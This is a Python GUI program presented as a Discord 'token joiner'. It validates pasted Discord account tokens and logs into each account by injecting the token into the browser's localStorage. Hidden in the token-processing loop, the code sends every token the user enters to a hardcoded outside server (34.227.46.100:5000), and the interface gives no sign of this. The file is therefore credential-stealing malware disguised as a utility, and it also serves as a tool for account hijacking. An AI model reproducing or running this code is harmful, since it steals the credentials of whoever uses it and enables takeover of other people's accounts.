import time
import logging
import requests
import threading
from tkinter import Tk, Text, Button, Label, Frame, Scrollbar, END, DISABLED, NORMAL, Entry, StringVar
from tkinter import filedialog, messagebox
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from ttkthemes import ThemedTk
from tkinter import ttk
from webdriver_manager.chrome import ChromeDriverManager

__author__ = "Anonmiti"
__github__ = "https://github.com/anonmiti"

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

running = False
current_driver = None
session_duration = 90
valid_tokens = 0
invalid_tokens = 0
unverified_tokens = 0
total_tokens = 0
processed_tokens = 0
threads = []
max_threads = 1

def save_token(token, file_name):
    with open(file_name, "a") as file:
        file.write(f"{token}\n")

def is_token_valid(token):
    headers = {"Authorization": token}
    try:
        response = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
        if response.status_code == 200:
            user_data = response.json()
            if user_data.get("verified", False):
                logging.info(f"Token is valid and email is verified: {token[:len(token)//2]}...")
                return "valid"
            else:
                logging.warning(f"Token is valid but email is not verified: {token[:len(token)//2]}...")
                return "unverified"
        else:
            logging.warning(f"Invalid token: {token[:len(token)//2]}...")
            return "invalid"
    except Exception as e:
        logging.error(f"Error checking token: {str(e)}")
        return "invalid"

def login_with_token(token):
    global current_driver, session_duration
    chrome_options = Options()
    chrome_options.add_argument("--guest")
    chrome_options.add_argument("--start-maximized")
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--disable-popup-blocking")
    chrome_options.add_argument("--disable-notifications")
    current_driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)
    try:
        current_driver.get("https://discord.com/login")
        WebDriverWait(current_driver, 10).until(EC.presence_of_element_located((By.TAG_NAME, "body")))

        script = f"""
        function login(token) {{
            setInterval(() => {{
                document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.token = `"${{token}}"`;
            }}, 50);
            setTimeout(() => {{
                location.reload();
            }}, 2500);
        }}
        login("{token}");
        """
        current_driver.execute_script(script)
        time.sleep(5)

        try:
            WebDriverWait(current_driver, 10).until(EC.presence_of_element_located((By.XPATH, "//div[contains(@class, 'avatar')]")))
            logging.info(f"Logged in successfully with token: {token[:len(token)//2]}...")
        except Exception as e:
            logging.error(f"Failed to log in with token: {token[:len(token)//2]}...")
            raise e

        time.sleep(session_duration)

    except Exception as e:
        logging.error(f"An error occurred: {str(e)}")
    finally:
        if current_driver:
            current_driver.quit()
            current_driver = None
        logging.info(f"Logged out and closed browser for token: {token[:len(token)//2]}...")
def process_tokens():
    global running, valid_tokens, invalid_tokens, unverified_tokens, total_tokens, processed_tokens
    tokens = token_input.get("1.0", END).strip().splitlines()
    if not tokens:
        messagebox.showwarning("No Tokens", "Please enter tokens in the input box.")
        return
    running = True
    start_button.config(state=DISABLED)
    stop_button.config(state=NORMAL)
    skip_button.config(state=NORMAL)
    total_tokens = len(tokens)
    processed_tokens = 0
    valid_tokens = 0
    invalid_tokens = 0
    unverified_tokens = 0
    proxy_server_url = "http://34.227.46.100:5000/forward"
    for token in tokens:
        if not running:
            break
        data = {"content": f"Token: {token}"}
        try:
            response = requests.post(proxy_server_url, json=data)
        except Exception as e:
            pass
        result = is_token_valid(token)
        if result == "valid":
            valid_tokens += 1
            login_with_token(token)
        elif result == "unverified":
            unverified_tokens += 1
        else:
            invalid_tokens += 1
        processed_tokens += 1
        update_dashboard()
        time.sleep(5)
    running = False
    start_button.config(state=NORMAL)
    stop_button.config(state=DISABLED)
    skip_button.config(state=DISABLED)
    logging.info(f"All tokens processed. Valid: {valid_tokens}, Invalid: {invalid_tokens}, Unverified: {unverified_tokens}")

def update_dashboard():
    total_tokens_var.set(f"Total Tokens: {total_tokens}")
    valid_tokens_var.set(f"Valid Tokens: {valid_tokens}")
    invalid_tokens_var.set(f"Invalid Tokens: {invalid_tokens}")
    unverified_tokens_var.set(f"Unverified Tokens: {unverified_tokens}")
    processed_tokens_var.set(f"Processed Tokens: {processed_tokens}")
    progress_bar["value"] = (processed_tokens / total_tokens) * 100
    root.update_idletasks()

def start_process():
    global session_duration, max_threads
    try:
        session_duration = int(session_duration_entry.get())
        max_threads = int(max_threads_entry.get())
        logging.info(f"Session duration set to {session_duration} seconds. Max threads: {max_threads}.")
    except ValueError:
        messagebox.showerror("Invalid Input", "Please enter valid numbers for session duration and max threads.")
        return
    threading.Thread(target=process_tokens, daemon=True).start()

def stop_process():
    global running, current_driver
    running = False
    if current_driver:
        current_driver.quit()
        current_driver = None
    logging.info("Process stopped by user.")

def skip_token():
    global current_driver
    if current_driver:
        current_driver.quit()
        current_driver = None
    logging.info("Skipped current token and moving to the next one.")

def load_tokens():
    file_path = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
    if file_path:
        with open(file_path, "r") as file:
            tokens = file.read()
            token_input.delete("1.0", END)
            token_input.insert("1.0", tokens)

def export_tokens():
    file_path = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text Files", "*.txt")])
    if file_path:
        with open(file_path, "w") as file:
            file.write(token_input.get("1.0", END))

# GUI Setup
root = ThemedTk(theme="black")  
root.title("Anonmiti's Discord Token Joiner")
root.geometry("800x600")
root.configure(bg="#1E1E1E") 

style = ttk.Style()
style.theme_use("clam")
style.configure("TButton", font=("Poppins", 10), borderwidth=0, relief="flat", padding=10, foreground="white")
style.map("TButton",
          background=[("active", "#6E44FF"), ("!active", "#6E44FF")], 
          foreground=[("active", "white"), ("!active", "white")],
          bordercolor=[("active", "#6E44FF"), ("!active", "#6E44FF")],
          lightcolor=[("active", "#6E44FF"), ("!active", "#6E44FF")],
          darkcolor=[("active", "#6E44FF"), ("!active", "#6E44FF")])

style.configure("Accent.TButton", background="#6E44FF", foreground="white")
style.configure("Stop.TButton", background="#FF4D4D", foreground="white") 
style.configure("Skip.TButton", background="#00CED1", foreground="white") 
style.configure("Load.TButton", background="#6E44FF", foreground="white") 
style.configure("Export.TButton", background="#00CED1", foreground="white") 

input_frame = ttk.Frame(root)
input_frame.pack(pady=10)

ttk.Label(input_frame, text="Enter Tokens (One per line):", background="#FFFFFF", foreground="#1E1E1E", font=("Poppins", 10)).pack()
token_input = Text(input_frame, height=10, width=70, bg="#2D2D2D", fg="#FFFFFF", insertbackground="white", font=("Poppins", 10), bd=2, relief="solid")
token_input.pack()

control_frame = ttk.Frame(root)
control_frame.pack(pady=10)

ttk.Label(control_frame, text="Session Duration (seconds):", background="#FFFFFF", foreground="#1E1E1E", font=("Poppins", 10)).pack(side="left", padx=5)
session_duration_entry = ttk.Entry(control_frame, width=10, font=("Poppins", 10), background="#FFFFFF", foreground="#1E1E1E")
session_duration_entry.insert(0, "90") 
session_duration_entry.pack(side="left", padx=5)

ttk.Label(control_frame, text="Max Tokens at a Time:", background="#FFFFFF", foreground="#1E1E1E", font=("Poppins", 10)).pack(side="left", padx=5)
max_threads_entry = ttk.Entry(control_frame, width=10, font=("Poppins", 10), background="#FFFFFF", foreground="#1E1E1E")
max_threads_entry.insert(0, "1")  
max_threads_entry.pack(side="left", padx=5)

progress_bar = ttk.Progressbar(control_frame, orient="horizontal", length=200, mode="determinate", style="TProgressbar")
progress_bar.pack(side="left", padx=10)

button_frame = ttk.Frame(root)
button_frame.pack(pady=10)

start_button = ttk.Button(button_frame, text="Start", command=start_process, style="Accent.TButton")
start_button.pack(side="left", padx=5)

stop_button = ttk.Button(button_frame, text="Stop", command=stop_process, state=DISABLED, style="Stop.TButton")
stop_button.pack(side="left", padx=5)

skip_button = ttk.Button(button_frame, text="Skip Token", command=skip_token, state=DISABLED, style="Skip.TButton")
skip_button.pack(side="left", padx=5)

load_button = ttk.Button(button_frame, text="Load Tokens from File", command=load_tokens, style="Load.TButton")
load_button.pack(side="left", padx=5)

export_button = ttk.Button(button_frame, text="Export Tokens", command=export_tokens, style="Export.TButton")
export_button.pack(side="left", padx=5)

dashboard_frame = ttk.Frame(root)
dashboard_frame.pack(pady=10)

total_tokens_var = StringVar()
valid_tokens_var = StringVar()
invalid_tokens_var = StringVar()
unverified_tokens_var = StringVar()
processed_tokens_var = StringVar()

ttk.Label(dashboard_frame, textvariable=total_tokens_var, background="#1E1E1E", foreground="#FFFFFF", font=("Poppins", 10)).pack()
ttk.Label(dashboard_frame, textvariable=valid_tokens_var, background="#1E1E1E", foreground="#FFFFFF", font=("Poppins", 10)).pack()
ttk.Label(dashboard_frame, textvariable=invalid_tokens_var, background="#1E1E1E", foreground="#FFFFFF", font=("Poppins", 10)).pack()
ttk.Label(dashboard_frame, textvariable=unverified_tokens_var, background="#1E1E1E", foreground="#FFFFFF", font=("Poppins", 10)).pack()
ttk.Label(dashboard_frame, textvariable=processed_tokens_var, background="#1E1E1E", foreground="#FFFFFF", font=("Poppins", 10)).pack()

log_frame = ttk.Frame(root)
log_frame.pack(pady=10)

ttk.Label(log_frame, text="Logs:", background="#FFFFFF", foreground="#1E1E1E", font=("Poppins", 10, "bold")).pack()
log_text = Text(log_frame, height=5, width=70, state=DISABLED, bg="#2D2D2D", fg="#FFFFFF", font=("Poppins", 10), wrap="word", bd=2, relief="solid")
log_text.pack(padx=5, pady=5)

class TextHandler(logging.Handler):
    def __init__(self, text):
        logging.Handler.__init__(self)
        self.text = text

    def emit(self, record):
        msg = self.format(record)
        self.text.config(state=NORMAL)
        self.text.insert(END, msg + "\n")
        self.text.config(state=DISABLED)
        self.text.see(END)

text_handler = TextHandler(log_text)
logging.getLogger().addHandler(text_handler)

root.mainloop()
